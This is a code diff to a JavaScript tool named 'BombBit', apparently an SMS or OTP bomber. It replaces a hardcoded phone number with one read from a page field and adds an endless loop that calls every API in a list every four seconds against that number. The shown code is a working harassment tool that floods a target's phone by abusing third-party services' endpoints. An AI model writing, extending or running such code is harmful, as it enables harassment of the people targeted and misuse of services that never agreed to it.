@@ -1,4 +1,4 @@
-const phone = "8268010014";
+let phone ;
 
 const API_LIST =[
     {
@@ -78,13 +78,34 @@ const BombBit = () =>{
     API_LIST.map((val,ind)=>{
 
         if(val.method.toLowerCase() == "post"){
-            callPostAPI(val);
+          //  callPostAPI(val);
             return;
         }
         callGetAPI(val);
     
     });
 }
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function CallApiLoop() {
+    phone = document.getElementById('phone').val;
+
+   if(phone.length === 10){
+    while(true){
+         BombBit();
+        await sleep(4000);
+    }
+}
+else{
+    alert("Invalid Phone number!");
+}
+          
+}
+
+
 
 
 
